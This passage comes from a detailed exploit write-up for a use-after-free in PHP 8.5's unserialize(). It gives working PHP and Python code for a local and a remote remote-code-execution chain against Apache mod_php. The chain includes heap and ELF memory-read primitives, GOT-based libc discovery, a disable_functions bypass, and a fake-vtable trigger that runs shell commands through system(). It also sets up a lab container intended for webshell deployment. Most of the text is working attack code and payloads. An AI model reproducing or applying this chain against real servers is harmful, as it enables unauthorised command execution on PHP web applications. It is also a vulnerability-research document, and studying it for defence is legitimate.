  → handler == zif_system
  → zif_system(execute_data, return_value)
    → php_exec(EXEC_SYSTEM, "id && uname -a", return_value, 0)
      → popen("id && uname -a", "r") → reads output → returns
```

The critical chain: the Zend VM reads `func.type` at obj+0x38 and sees `ZEND_INTERNAL_FUNCTION (1)`. For internal functions, `ZEND_DO_FCALL` loads the handler pointer from `func->internal_function.handler` (obj+0x90) and calls it directly with the standard `(zend_execute_data*, zval*)` ABI. Since `zif_system` is a normal internal function handler, it reads the first argument from `execute_data` (the command string passed by the PHP caller) and calls `php_exec()`.

This is why the local exploit uses `zif_system` rather than libc `system()`: the Zend VM passes arguments through `execute_data`, not as C function arguments. `zif_system(execute_data, return_value)` correctly extracts the string argument from the execute_data frame. A raw libc `system(execute_data)` would misinterpret the execute_data pointer as a `const char*`, crashing or executing garbage.

## IS_OBJECT Type Confusion: Full Trigger Sequence

Putting it all together, Phase 8 fires one final UAF to create the IS_OBJECT confusion:

```php
$spray = build_spray_isobject($obj_addr);  // Bucket[0] = IS_OBJECT → fake closure
$payload = build_payload($spray, 1);       // 1 stale reference: R:4
$result = @unserialize($payload);          // triggers UAF, reclaims with IS_OBJECT spray
$result[33]("id && uname -a");             // calls the fake Closure → zif_system
```

```
unserialize(payload)
  │
  ├─ CachedData::unserialize() → inner parse + property add → efree(old arData)
  │
  ├─ spray 32 × 280-byte strings → one reclaims freed bin-320 slot
  │    spray[0x28..0x33] = { value: obj_addr, type: 0x0308 }  ← IS_OBJECT
  │
  ├─ R:4 resolves through stale pointer → reads spray Bucket[0]
  │    engine sees: zval { .value = obj_addr, .type = IS_OBJECT }
  │    $result[33] is now a "live" zend_object*
  │
  └─ $result[33]("id && uname -a")
       │
       ├─ ZEND_INIT_DYNAMIC_CALL: obj->ce == zend_ce_closure ✓
       ├─ zend_get_closure_invoke_method → &obj->func (at obj+0x38)
       ├─ func.type = 1 (ZEND_INTERNAL_FUNCTION)
       ├─ ZEND_DO_FCALL: handler = *(obj+0x90) = zif_system
       └─ zif_system("id && uname -a") → shell execution
```

The entire code execution path, from stale pointer resolution to shell command, involves zero writes to memory. The engine reads our crafted data and follows its normal dispatch logic. The only "corruption" is the type field in the spray string, which makes the engine interpret a controlled pointer as an object.

# Full Chain (Local)

```
unserialize(payload)
    │
    ├─ CachedData::unserialize()
    │    inner unserialize() shares outer var_hash
    │    stdClass properties registered as R:4..R:11
    │    adding dynamic props → arData resize → old arData freed
    │
    ├─ spray 32 × 280-byte strings → reclaim freed bin-320 slot
    │
    ▼
Phase 1: heap_leak()
    │  R:4..R:11 resolve through stale pointers
    │  ZVAL_MAKE_REF writes zend_reference* back into spray
    │  compare spray vs original → leaked heap address
    │  chunk = addr & ~0x1FFFFF
    ▼
Phase 2: find_object_pointers() - Closure spray + mega-string
    │  spray 256 Closures into heap
    │  fake zend_string at chunk-0x10 → 2MB read window
    │  scan for zend_object gc patterns (IS_OBJECT, valid handle, pad=0)
    │  group by handlers address → most common = Closure objects
    │  → closure_ce, closure_handlers (both .bss/.data addresses)
    ▼
Phase 3: find_function_table_ht() - .bss scan
    │  scan near closure_handlers for 3 consecutive pointers
    │  (function_table, class_table, zend_constants)
    │  dereference function_table pointer → HashTable struct
    │  validate nTableMask (neg power-of-2), nNumUsed (100-10000)
    │  → function_table arData, nTableMask
    ▼
Phase 4: find_symbol_table()
    │  try both ft_off decompositions (0x1b0, 0x1c8)
    │  symbol_table = EG + 0x130 (embedded HashTable)
    │  validate nTableMask, nNumUsed < 500
    │  → symbol_table address
    ▼
Phase 5: find_system()
    │  if system() not disabled:
    │    DJBX33A hash lookup in function_table for "system"
    │    read zend_function.handler at +0x58
    │  if system() in disable_functions:
    │    look up "var_dump" in function_table → zend_internal_function
    │    read module pointer at +0x60 → zend_module_entry (standard)
    │    read functions array at module+0x28 → zend_function_entry[]
    │    walk entries (0x30 bytes each) for "system" name
    │    read original handler at entry+0x08 (bypasses disable_functions)
    │  → zif_system handler address
    ▼
Phase 6: build_fake_closure() + IS_OBJECT confusion
    │  fake zend_closure in PHP string:
    │    ce = closure_ce, handlers = closure_handlers (Phase 2)
    │    func.handler = zif_system (Phase 5)
    │  find string address via symbol_table lookup for "_xfc"
    │  spray IS_OBJECT zval → R:4 → fake Closure
    │  $result[$idx]("id && uname -a")
    │    → zif_system → php_exec
    ▼
uid=1000(x) gid=1000(x) groups=1000(x) ...
Linux node 6.8.0-110-generic ... x86_64 GNU/Linux
```

---

# Part II: Remote Exploitation

The local exploit runs as PHP code on the same machine. The remote exploit achieves the same result, arbitrary command execution as the web server user, using only HTTP POST requests against any PHP application that passes attacker-controlled data to `unserialize()`. The exploit is a standalone Python script requiring no local access, no `/proc`, no hardcoded offsets, and no knowledge of the target binary.

## Docker Lab Setup

The exploit is tested against a Docker container running `php:8.5-apache` (Debian-based, Apache mod_php prefork MPM, jemalloc-backed ZendMM):

```dockerfile
FROM php:8.5-apache

# Apache prefork is default in this image. Ensure it's configured.
RUN a2dismod mpm_event 2>/dev/null; a2enmod mpm_prefork 2>/dev/null; true

# Deploy the vulnerable app
COPY remote_app.php /var/www/html/remote_app.php

# Make DocumentRoot writable by www-data (for webshell deployment)
RUN chmod o+w /var/www/html

# Increase prefork workers so we survive probing
RUN echo '\nMaxRequestWorkers 256\nServerLimit 256\nStartServers 16\nMinSpareServers 8\nMaxSpareServers 32' >> /etc/apache2/apache2.conf

EXPOSE 80
```

Build and run:

```sh
docker build -t php855-vuln .
docker run -d --name php855-test -p 9091:80 php855-vuln
```

The high `MaxRequestWorkers` (256) is critical: the exploit's probing phase crashes many workers (unmapped address reads kill the handling Apache child), and Apache must respawn replacements fast enough to keep accepting connections. With the default 10 workers, the container becomes unresponsive after a burst of probes.

# Remote Exploitation Overview

The fundamental challenge of remote exploitation is that we can no longer index into PHP strings or call PHP functions to examine memory. The only channel back to the attacker is `serialize($result)`, the serialized output of the `unserialize()` call. Everything we learn about the target's memory layout must be extracted through this channel.

The remote exploit uses **9 phases**, each consisting of one or more HTTP requests that trigger the UAF with different spray contents:

| Phase | Purpose | Requests |
|-------|---------|----------|
| 1 | Heap address leak | 1 |
| 2 | ELF header scan (2MB-aligned near heap) | ~30–60 |
| 2.5 | Fine-grained scan (1MB steps near best ELF) | ~20–60 |
| 3 | libphp symbol resolution (.gnu_hash + PT_DYNAMIC) | ~10 |
| 3.5 | libc discovery via libphp GOT → smart ELF base search | ~1500–2000 |
| 4 | Read EG.function_table and EG.class_table | ~50 |
| 5 | Hash table lookup for "system" in function_table | ~5 |
| 6 | Read zif_system handler address | 1 |
| 7 | libc system() (resolved in Phase 3.5) | 0 |
| 8 | Spray slot discovery via ZMM chunk metadata | ~10 |
| 9 | RCE trigger (IS_OBJECT type confusion) | 1 |
| **Total** | | **~2,000** |

Phase 3.5 dominates the request count. It reads ~83KB of libphp's GOT via the `DT_PLTRELSZ` anchor trick, extracts resolved libc function pointers, and searches backward from each candidate to find libc's ELF base. Most of the ~1500 requests are ELF-base-search probes that crash workers (unmapped pages between DSOs).

## Key Differences from Local

| Aspect | Local | Remote |
|--------|-------|--------|
| **Execution context** | PHP code on target | Python script over HTTP |
| **Bulk read** | Mega-string (2MB window, single trigger) | IS_STRING arb-read (per request) |
| **Binary discovery** | Closure spray + gc pattern scan | ELF header scan at 2MB boundaries |
| **Symbol resolution** | .bss proximity scan from closure_handlers | .gnu_hash + PT_DYNAMIC parsing |
| **system() source** | zif_system from function_table or module entry table | libc system() resolved from libc's .gnu_hash |
| **disable_functions** | Bypassed via module function entry table walk | N/A (calls libc system() directly) |
| **libc discovery** | Not needed (zif_system calls system() internally) | GOT read via DT_PLTRELSZ → external pointer groups → ELF base search |
| **Fake object location** | PHP string variable (found via symbol_table) | Spray slot (found via ZMM chunk metadata) |
| **Fake object type** | zend_closure (call via $func()) | IS_OBJECT stdClass (serialize triggers get_properties_for) |
| **Command output** | Direct return value | Write to /dev/shm, or webshell |
| **Worker lifecycle** | Single process, survives re-trigger | Apache prefork: each UAF kills one worker |

# Attack Surface and Threat Model

The target is any PHP application running on Apache mod_php (prefork MPM) that passes user-controlled data to `unserialize()`. The application must include the `CachedData` gadget class (or an equivalent `Serializable` implementer that triggers the var_hash sharing bug).

```php
// remote_app.php - minimal vulnerable endpoint
class CachedData implements Serializable {
    public function serialize(): string { return ''; }
    public function unserialize(string $data): void {
        unserialize($data)->x = 0;
    }
}
echo serialize(@unserialize($_REQUEST['cook']));
```

Apache prefork is the critical deployment detail: each worker is a separate process with its own address space. When a UAF spray corrupts a zval and the serialize output path crashes (e.g., dereferencing an unmapped fake pointer), **only that one worker dies**, Apache spawns a replacement. The exploit can make hundreds of "probing" requests where most crash workers but the successful ones return data. This crash-and-respawn model is what makes the blind memory oracle possible.

# IS_STRING Arbitrary Read Primitive

The core building block for every remote phase is the **IS_STRING type confusion read**. By setting the spray's Bucket[0] `type_info` to `0x06` (IS_STRING) and the value to a target address, we make the stale `R:4` reference resolve as a PHP string whose `len` and `val` come from attacker-chosen memory.

## How It Works

A `zend_string` in PHP 8.x has this layout:

```
zend_string:
  +0x00: gc          (8 bytes)
  +0x08: h           (8 bytes) - hash cache
  +0x10: len         (8 bytes) - string length
  +0x18: val[0]      (len bytes) - string data
```

When we point Bucket[0]'s value at address `A`, the engine interprets:

- `len = *(uint64_t*)(A + 0x10)`, controls how many bytes `serialize()` outputs
- `val = (char*)(A + 0x18)`, the memory that gets serialized as the string's content

The serialize output contains `s:LEN:"DATA";` where LEN is the `len` value and DATA is `len` bytes read starting at `A + 0x18`. We parse this from the HTTP response to extract the raw memory content.

```python
def isstring_read(fake_str_addr):
    """One HTTP request → read memory at fake_str_addr+0x18, length from fake_str_addr+0x10."""
    spray = bytearray(280)
    # Bucket[0] (overlays spray content offset 0x28): value = fake_str_addr, type = IS_STRING (0x06)
    struct.pack_into('<Q', spray, 40, fake_str_addr)   # offset 0x28 = arData+0x40 - spray val[]+0x18
    struct.pack_into('<I', spray, 48, 0x06)
    # All other buckets: IS_LONG (type=4) for GC safety
    for k in [0,2,3,4,5,6,7]:
        struct.pack_into('<I', spray, 8 + k*32, 0xBBBB0000 + k)
        struct.pack_into('<I', spray, 8 + k*32 + 8, 0x04)
    # Build payload with R:4 referencing Bucket[0] (the first inserted property's slot)
    payload = build_uaf_payload(spray, ref_count=1)
    response = send_http(payload)
    # Parse: find s:LEN:"..." in serialized output for R:4's entry
    return parse_string_from_response(response)
```

If `len` happens to be zero (the qword at `A+0x10` is 0), we get an empty string, no crash, but no data. If the address is unmapped, the worker crashes and we get no response. Both cases are distinguishable from a successful read.

## The Malloc Chunk Header Trick

Many reads target heap-allocated structures (hash tables, zend_function entries). These are preceded by a jemalloc/ZendMM chunk header. By pointing `fake_str` at `allocation_addr - 0x18`, the layout becomes:

```
fake_str at (alloc - 0x18):
  +0x10 = alloc - 0x08 = chunk_size field (always non-zero for live allocations)
  +0x18 = alloc + 0x00 = start of the structure we want to read
```

The `len` field overlaps with the malloc metadata's size field, which is always a reasonable non-zero value. This gives us a clean read of the target structure with a known length.

# Remote Phase 1: Heap Leak

Identical in principle to the local Phase 1: spray all 8 stale references (`R:4` through `R:11`) with `IS_LONG` markers, then compare the serialized output against the original spray content. `ZVAL_MAKE_REF` writes a `zend_reference*` back into the spray string, corrupting the IS_LONG value with a heap pointer.

```python
def heap_leak():
    spray = bytearray(280)
    for k in range(8):
        struct.pack_into('<I', spray, 8 + k*32, 0xBBBB0000 + k)
        struct.pack_into('<I', spray, 8 + k*32 + 8, 0x04)  # IS_LONG
    # 8 stale references: R:4..R:11
    payload = build_uaf_payload(spray, ref_count=7)
    output = send_http(payload)
    # Find modified spray string, extract zend_reference pointer
    for each s:280 string in output:
        for each bucket position:
            if current_value != original_value and current_value > 0x10000:
                return current_value  # heap address
```

Result: `heap_ref = 0x7477dfc57200`, chunk base = `heap_ref & ~0x1FFFFF` = `0x7477dfc00000`.

# Remote Phase 2: ELF Header Scan

Without `/proc/self/maps`, we discover loaded ELF binaries by scanning 2MB-aligned addresses near the heap. Shared libraries on x86_64 Linux are mmap'd at page-aligned boundaries, and the process's address space is compact enough that the heap chunk is typically within a few hundred 2MB pages of libphp.

For each candidate address, we use `isstring_read(candidate + 0x10)` which reads `len` from `candidate + 0x20` (the ELF `e_phoff` field, typically 0x40 = 64) and data from `candidate + 0x28`. The ELF header contains identifiable constants at fixed offsets:

```
ELF header (Elf64_Ehdr, 64 bytes):
  +0x00: 0x7F 'E' 'L' 'F'   (magic)
  +0x20: e_phoff     = 64    (phdr offset - gives us len=64)
  +0x34: e_ehsize    = 64    (always 64 for ELF64)
  +0x36: e_phentsize = 56    (always 56 for ELF64)
  +0x38: e_phnum     = N     (program headers - typically 10-15)
```

The data starts at ELF offset 0x28; from data offset 0x0C we check `e_ehsize == 64`, `e_phentsize == 56`, and `3 <= e_phnum <= 20`:

```python
for i in range(256):
    for direction in [+1, -1]:
        candidate = chunk_base + direction * i * 0x200000
        r = isstring_read(candidate + 0x10)
        if r and r[0] == 64:  # e_phoff = 64
            sdata = r[1]
            e_ehsize = unpack('<H', sdata, 0x0C)    # 64
            e_phentsize = unpack('<H', sdata, 0x0E)  # 56
            e_phnum = unpack('<H', sdata, 0x10)      # 3-20
            if valid: elf_candidates.append((candidate, e_phnum))
    # Stop early when we have 2+ large ELFs (phnum >= 10)
    if len([epn for _, epn in elf_candidates if epn >= 10]) >= 2:
        break
```

The `e_phnum` value distinguishes DSO types: libphp has 10 phdrs, Apache modules have 9, libc has 14–15. The scan stops early once 2+ large ELFs are found.

In the Docker `php:8.5-apache` image, the ZendMM heap (`[anon:zend_alloc]`) is typically within 28–200 MB of libphp's load address. The 2MB-aligned scan finds libphp in ~30 requests.

## Phase 2.5: Fine-Grained Scan

DSOs are not always 2MB-aligned, they can be loaded at arbitrary page (4KB) boundaries. Phase 2.5 scans at 1MB steps around the highest-phnum ELF found in Phase 2, searching ±128 MB in both directions:

```python
ref_base = max(elf_candidates, key=lambda x: x[1])[0]
for direction in [-1, +1]:
    for step in range(1, 129):
        candidate = ref_base + direction * step * 0x100000
        epn = check_elf(candidate)
        if epn is not None and epn >= 10:
            break  # found another large DSO
```

This catches libc when it's not 2MB-aligned but is still near libphp. The scan breaks early after 32 consecutive misses or finding a large ELF.

# Remote Phase 3: Dynamic Symbol Resolution

This is the most technically complex phase. For each ELF candidate, we resolve symbols from the `.gnu_hash` section using the ELF's `PT_DYNAMIC` segment to locate `.dynsym` and `.dynstr`.

## Reading the ELF Window

Each ELF has program headers (phdrs) starting at offset 0x40. We need a large contiguous read covering the `.gnu_hash`, `.dynsym`, and `.dynstr` sections, typically the first few hundred KB of the ELF.

The trick: phdr fields contain values usable as IS_STRING length anchors. `p_align` (offset +0x30 within each phdr) is 0x200000 for the main LOAD segment of libphp, pointing `fake_str` at `phdr.p_align - 0x10` gives `len = 0x200000` and reads 2MB of ELF data. For libc (where `p_align = 8`, too small), we fall back to `p_filesz` or `p_memsz` fields from other phdrs.

```python
def elf_read_window(base, phnum):
    # Try p_align, p_filesz, p_memsz from first 3 phdrs
    for phdr_index in range(3):
        for field_offset in (0x30, 0x20, 0x28):  # p_align, p_filesz, p_memsz
            field_addr = base + 0x40 + phdr_index * 56 + field_offset
            r = isstring_read(field_addr - 0x10)
            if r and r[0] >= 56:
                # This phdr field value works as a len anchor
                # Now use the same trick with the best candidate
                ...
    # Prefer 0x10000-0x400000 range (moderate reads), then try larger
```

## Parsing PT_DYNAMIC

The `PT_DYNAMIC` program header (type=2) points to the `.dynamic` section, which contains `DT_SYMTAB`, `DT_STRTAB`, and `DT_GNU_HASH` entries, the actual runtime addresses of these sections:

```python
# Find PT_DYNAMIC in phdrs
for phdr in phdrs:
    if phdr.p_type == 2:  # PT_DYNAMIC
        dyn_addr = base + phdr.p_vaddr
        # Parse 16-byte entries: d_tag(8) + d_val(8)
        for entry in dynamic_section:
            if d_tag == 5:  strtab = base + d_val  # DT_STRTAB
            if d_tag == 6:  symtab = base + d_val  # DT_SYMTAB
            if d_tag == 0x6FFFFEF5:  gnu_hash = base + d_val  # DT_GNU_HASH
```

When PT_DYNAMIC is outside the read window (common for libc where the dynamic section is in the writable data segment), we read it via `isstring_read` with an offset anchor before the section.

## .gnu_hash Lookup

With the actual `symtab` and `strtab` addresses from PT_DYNAMIC, we perform standard GNU hash lookups within our read window:

```
.gnu_hash header (16 bytes):
  nbuckets, symoffset, bloom_size, bloom_shift

Lookup("system"):
  1. Compute h = gnu_hash("system")
  2. Check bloom filter: bloom[h/64 % bloom_size] has bits set
  3. Read bucket: si = buckets[h % nbuckets]
  4. Walk chain from si: compare (chain[si-symoffset] | 1) == (h | 1)
  5. On match: read Elf64_Sym at symtab + 24*si
  6. Verify name via strtab + sym.st_name
  7. Return sym.st_value (offset from base)
```

### The Alignment Gap Problem

An earlier version computed `symtab = chains_end` (assuming `.dynsym` immediately follows `.gnu_hash` chains). For libphp this worked, but for libc there was a 4-byte alignment gap between chains_end (0x4ACC) and the actual `.dynsym` (0x4AD0). The fix: `symtab = (chains_end + 7) & ~7`, align to 8 bytes, matching the `Elf64_Sym` alignment requirement. With PT_DYNAMIC parsing, this fallback is only needed when the dynamic section is unreadable.

### Window Merging for Large ELFs

When `.dynsym`/`.dynstr` are outside the initial read window (they can be at very different offsets in libc), the exploit reads a second region anchored at the symtab address and merges both windows into a single virtual address space:

```python
if symtab outside window:
    sym_data = isstring_read(symtab - 0x10)
    # Merge: create contiguous buffer covering both regions
    merged = bytearray(max_addr - min_addr)
    merged[orig_offset:] = original_window
    merged[sym_offset:] = sym_data
```

## Symbols Resolved from libphp

- `executor_globals`, the EG struct base address (.bss)
- `compiler_globals`, CG struct (.bss)
- `std_object_handlers`, default object handlers vtable (.data)
- `__pltgot__`, PLTGOT address (from DT_PLTGOT in .dynamic)
- `__dynamic__`, PT_DYNAMIC virtual address

libc is **not** resolved in Phase 3, it requires a separate discovery mechanism described in Phase 3.5.

# Remote Phase 3.5: libc Discovery via libphp GOT

The remote exploit needs libc's `system()` for the RCE trigger (the `get_properties_for` vtable hijack requires a C-ABI function pointer, not PHP's `zif_system` which takes `(zend_execute_data*, zval*)`). But libc is typically not found by the 2MB-aligned ELF scan in Phase 2, it may be at a non-aligned address, or the heap-to-libc distance may exceed the scan range.

The key insight: libphp's `.got.plt` contains **resolved** pointers to libc functions (after the dynamic linker processes relocations at load time). If we can read the GOT, we get absolute libc addresses for free.

## Reading the GOT via DT_PLTRELSZ

Phase 3 already parsed libphp's `.dynamic` section and extracted `DT_PLTGOT` (the GOT address). The problem is reading a large chunk of the GOT, we need an IS_STRING `len` anchor.

The `.dynamic` section itself provides one: `DT_PLTRELSZ` (tag 2), whose `d_val` is the total size of PLT relocations, typically ~83KB for libphp. This value sits at a known offset within `.dynamic`, and the GOT/GOT.PLT sections follow `.dynamic` in the data segment.

```
libphp data segment layout:
  .dynamic    @ base+0x168a6c8  (DT_PLTRELSZ d_val = 82872)
  .got        @ base+0x168a948
  .got.plt    @ base+0x168bfe8
```

By constructing a fake zend_string where `len` overlaps with DT_PLTRELSZ's `d_val` field, we read ~83KB starting from `.dynamic` through `.got.plt`:

```python
# dyn_data_base = absolute address that dyn_data[0] corresponds to
# pltrelsz_off = offset of DT_PLTRELSZ d_val within dyn_data
pltrelsz_addr = dyn_data_base + pltrelsz_off
fake_str = pltrelsz_addr - 0x10   # len = *(pltrelsz_addr) = 82872
r = isstring_read(fake_str)       # reads 82872 bytes from pltrelsz_addr+0x08
```

### The d_val Anchor Offset Bug

A subtle issue: when reading `.dynamic` via the anchor technique (`isstring_read(dyn_addr - 0x08)`), data starts at `dyn_addr + 0x10`, not `dyn_addr`. So `dyn_data[0]` corresponds to address `dyn_addr + 0x10`, and `pltrelsz_addr = dyn_data_base + pltrelsz_off` where `dyn_data_base = dyn_addr + 0x10`. Getting this wrong by 0x10 bytes causes the IS_STRING read to dereference a GOT entry (a huge pointer) as the length, crashing the worker.

## Extracting External Pointers

The 83KB read covers `.dynamic`, `.got`, and `.got.plt`. We scan for 8-byte-aligned values that look like resolved function pointers, valid userspace addresses outside the libphp address range:

```python
ext_ptrs = []
libphp_end = elf_base + 0x1800000
for offset in range(0, len(got_data) - 7, 8):
    ptr = struct.unpack_from('<Q', got_data, offset)[0]
    if ptr < 0x100000000 or ptr > 0x7FFFFFFFFFFF:
        continue
    if elf_base <= ptr < libphp_end:
        continue  # internal libphp pointer
    if not any(abs(ptr - ep) < 0x80000 for ep in ext_ptrs):
        ext_ptrs.append(ptr)
```

This typically yields ~24 unique pointer groups, of which ~18 are "nearby" (within 256MB of libphp). Each group represents a resolved PLT entry pointing into a different shared library, libc, libm, libz, libssl, etc.

## Smart ELF Base Search

For each candidate pointer, we search backward through memory to find the ELF header of the DSO it belongs to:

```python
for ext_ptr in nearby_pointers:
    page = ext_ptr & ~0xFFF
    # Search from offset 0x7F000 down to 0x1F000 (typical libc text size)
    for est_off in range(0x7F000, 0x1F000, -0x1000):
        candidate = page - est_off
        r = isstring_read(candidate + 0x10)
        # Check ELF signature: e_ehsize=64, e_phentsize=56, 3<=e_phnum<=20
        if is_elf and e_phnum >= 12:  # libc has phnum >= 12
            syms = elf_resolve_symbols(candidate, e_phnum, ['system'])
            if 'system' in syms:
                libc_system_addr = base + syms['system']
                break
```

The `e_phnum >= 12` filter avoids wasting time resolving symbols from Apache modules (phnum=9) or other small DSOs. libc has 14–15 phdrs.

### Fallback Strategies

If the GOT-based search fails, the exploit has two fallback strategies:

**Strategy B (data segment scan):** Read large chunks of the libphp data segment near `std_object_handlers`, extract any pointer more than 4GB from the heap (a DSO region indicator), trace each back to an ELF base.

**Strategy C (forward scan):** Coarse 2MB-step scan forward from `executor_globals`, checking each mapped address for ELF headers or tracing back from mapped pages. Stops after 80 consecutive unmapped probes.

In practice, the GOT-based search (Strategy 1.5) finds libc reliably: libphp imports `popen`, `strlen`, `memcpy`, `dlopen`, and dozens of other libc functions, so the GOT always contains libc pointers.

# Remote Phase 4–5: EG Globals and function_table Lookup

With `executor_globals` known from Phase 3, we need to read `EG.function_table` (at EG+0x1C8 on PHP 8.5) and `EG.class_table` (at EG+0x1D0). Both are BSS pointers, we need a non-zero value at the IS_STRING `len` position to read them.

## BSS Length Anchor Scan

The BSS segment around EG contains various global variables. We scan from EG-0x800 to EG+0x1C0 looking for any 8-byte-aligned address where `isstring_read` returns a non-zero, bounded length whose data range covers both EG+0x1C8 and EG+0x1D0:

```python
for scan_off in range(-0x800, 0x1C0, 8):
    fs = eg + scan_off
    data_start = fs + 0x18
    if data_start > eg + 0x1C8:  # can't reach function_table
        continue
    r = isstring_read(fs)
    if r and 0 < r[0] < bss_end - data_start:
        ft_off = (eg + 0x1C8) - data_start
        ct_off = (eg + 0x1D0) - data_start
        if ct_off + 8 <= len(r[1]):
            function_table = unpack('<Q', r[1], ft_off)
            class_table = unpack('<Q', r[1], ct_off)
```

Typically finds an anchor at EG-0x7D0 with `len=28005` (some other global variable), giving a read window covering the entire EG struct.

## Hash Table Lookup for "system"

With `function_table` address known, we read the HashTable struct via the malloc chunk header trick (`isstring_read(ft - 0x18)` → `len = chunk_size`, data = HT struct), extract `nTableMask`, `arData`, and `nNumUsed`, then perform the same DJBX33A hash lookup as the local exploit:

```
function_table.arData → hash("system") | nTableMask → bucket chain
  → Bucket.val = zend_internal_function*
    → func+0x58 = handler = zif_system address in libphp
```

# Remote Phase 6–7: Handler Resolution and libc system()

Phase 6 reads the `zif_system` handler from the `zend_internal_function` struct. This is a verification step, it confirms we found the right function entry and extracts the internal handler address (`zif_system` inside libphp).

Phase 7 uses `system()` resolved from **libc's `.gnu_hash`** in Phase 3.5. The local exploit can use `zif_system` directly (PHP's wrapper) because it calls through the Zend function dispatch mechanism. The remote exploit uses libc's `system()` because the RCE trigger goes through the `get_properties_for` handler (a C function pointer called with `zobj` as the first argument), this bypasses PHP's argument-passing convention entirely and requires a function with the standard C ABI: `int system(const char *)`.

Note: `zif_system` takes `(zend_execute_data*, zval*)` and would misinterpret the object pointer as an execute_data frame, crashing instead of executing the command. This is why libc discovery is necessary despite having the PHP-level system() already resolved.

# Remote Phase 8: Spray Slot Discovery via ZMM Chunk Metadata

The critical challenge unique to the remote exploit: we need to know the **absolute address** of a spray string in memory. The local exploit looks up a named variable in `EG.symbol_table` to find its string address. Remotely, we have no variable names, the spray strings are anonymous elements of the unserialized array.

## ZendMM Chunk Metadata

Every ZendMM 2MB chunk has metadata at its header describing which pages are allocated and for which bin size:

```
zend_mm_chunk:
  +0x00: zend_mm_heap *heap
  +0x40: zend_mm_heap heap_struct (embedded)
  +0x50: heap.size (size_t) - total size of the chunk region
  +0xE8: free_slot[16] - head of free list for bin-320
  +0x250: page_map[512] - per-page allocation metadata (uint32 each)
```

We read the chunk metadata using `isstring_read(chunk + 0x40)`, this places `len` at `chunk + 0x50` (= `heap.size`, typically ~476800) and reads data starting from `chunk + 0x58`, covering the page map.

## Finding Bin-320 Pages

The page map at chunk+0x250 encodes each page's status:

```
page_info (uint32):
  bit 31: SRUN (small-object run start)
  bit 30: LRUN/NRUN
  bits 4-0: bin number (for SRUN)
  bits 24-16: free_count (for SRUN) or offset (for NRUN)
```

We scan for pages marked as SRUN with `bin_num = 16` (bin-320, the bin for 257–320 byte allocations). The first such page is the start of the bin-320 run where our spray strings live.

## Probing Individual Slots

Each bin-320 slot is 320 bytes. Starting from `run_start`, we probe each slot with `isstring_read(slot_addr)` and look for one that returns `len = 280` (our spray string content length):

```python
run_start = chunk_base + bin320_page * 0x1000
for slot in range(64):
    addr = run_start + slot * 320
    r = isstring_read(addr)
    if r and r[0] == 280:  # found a spray string
        S = addr + 0x18    # data starts at zend_string.val
        break
```

`S` is now the absolute address of our spray string's content in the target's memory. This is the address we'll embed in the RCE payload.

# Remote Phase 9: IS_OBJECT RCE Trigger

The local exploit creates a fake `zend_closure` and invokes it as a PHP function, `$result[$idx]("cmd")` dispatches through the Zend VM's ZEND_DO_FCALL opcode. The remote exploit cannot call PHP functions: the only code path that runs after `unserialize()` returns is `serialize($result)`, which the vulnerable app echoes back to the attacker. We need a code execution path that triggers during serialization, not during explicit function calls.

The solution: make `serialize()` dispatch through a **vtable function pointer** we control. When `serialize()` encounters an IS_OBJECT zval, it reads the object's `handlers->get_properties_for` to enumerate the object's properties. By pointing this vtable entry at libc `system()` and placing the command string at the start of the fake object, we achieve RCE.

## The Constraint: No Code Execution After unserialize()

The vulnerable application is a single line:

```php
echo serialize(@unserialize($_REQUEST['cook']));
```

`unserialize()` returns an array. The local exploit controls what happens next, it calls `$result[33]("cmd")` to invoke the fake closure. The remote exploit controls nothing after `unserialize()` returns: the application calls `serialize($result)` on whatever came back and echoes the output. The attacker never executes PHP code.

This means code execution must happen **inside** `serialize()` itself. We need `serialize()` to follow a code path that makes an indirect call through a pointer we control. The only such path: object serialization, where the engine reads the object's vtable to enumerate its properties.

## From UAF to Fake Object (Same Mechanism, Different Payload)

The type confusion mechanism is identical to the local exploit's Phase 6, only the spray content differs. Here is the complete sequence:

1. **Trigger the UAF**: The outer `unserialize()` processes `CachedData` (a `Serializable` class). Inside `CachedData::unserialize()`, the inner `unserialize()` shares the outer `var_hash`. Property additions (`$row->_c1` through `$row->_c10`) grow the inner stdClass's property table, eventually triggering `zend_hash_do_resize()` → `erealloc()` → `efree(old arData)`. The outer var_hash's R: references still point to the freed arData.

2. **Spray reclaims the freed slot**: 32 copies of a 280-byte string follow the `CachedData` in the serialized array. The freed arData was a bin-320 allocation (280 bytes of string content + zend_string header = 320 bytes). PHP's ZMM allocator recycles free slots from the same bin, so one spray string occupies the exact memory the old arData occupied.

3. **R:4 resolves through the stale pointer**: The outer `unserialize()` processes `R:4`, which calls `var_access()` on the old arData pointer. The engine reads 16 bytes from Bucket[0] (offset 0x28 = 40 in the spray content; bucket[k] overlays spray val offset `0x28 + k*0x20`) as a zval. We control those bytes:

   ```
   spray[40..47] = fake_obj_addr     (8-byte pointer to our fake object)
   spray[48..51] = 0x00000008        (type_info = IS_OBJECT)
   ```

   The engine sees a zval with type IS_OBJECT and value pointing to `S+104`, a location further inside the same spray string where our fake `zend_object` lives.

4. **$result[33] is now a fake zend_object***: The outer `unserialize()` stores this IS_OBJECT zval in the result array at index 33 (= SPRAY_COUNT + 1). The engine believes this is a legitimate PHP object.

5. **serialize() encounters the fake object**: The application calls `serialize($result)`. When the serializer reaches `$result[33]`, it enters the IS_OBJECT branch of `php_var_serialize_intern()`. It reads `obj->ce` (our stdClass pointer), checks for `__serialize` and `serialize` methods (both NULL for stdClass), then calls `zend_get_properties_for(obj)`, which reads `obj->handlers->get_properties_for` from our fake vtable and calls it with `rdi = obj`.

6. **system() executes the command**: The vtable's `get_properties_for` slot (at handlers+0xC8) points to libc `system()`. The call becomes `system(obj)`, which reads the bytes at `obj+0x00` as a C string, our command `"\nid>/dev/shm/x"`.

```
unserialize(payload)                         serialize($result)
─────────────────                            ──────────────────
CachedData::unserialize()                    for each $result[i]:
  → inner unserialize + property add           ...
  → efree(old arData)                          $result[33]: type = IS_OBJECT
                                                 → obj = S+104 (fake zend_object)
32 × spray strings reclaim freed slot            → ce = stdClass ✓
  → spray[40..51] = IS_OBJECT zval               → handlers = S (fake vtable)
                                                 → handlers[0xC8] = system()
R:4 resolves → reads spray Bucket[0]             → system(obj)
  → $result[33] = fake zend_object*              → /bin/sh -c "\nid>/dev/shm/x"
```

The entire attack surface is one HTTP POST: the payload triggers the UAF, sprays the type confusion, and the application's own `serialize()` call dispatches through the fake vtable to `system()`. The attacker never needs to execute PHP code or control any code path after `unserialize()` returns.

## Why Not zif_system?

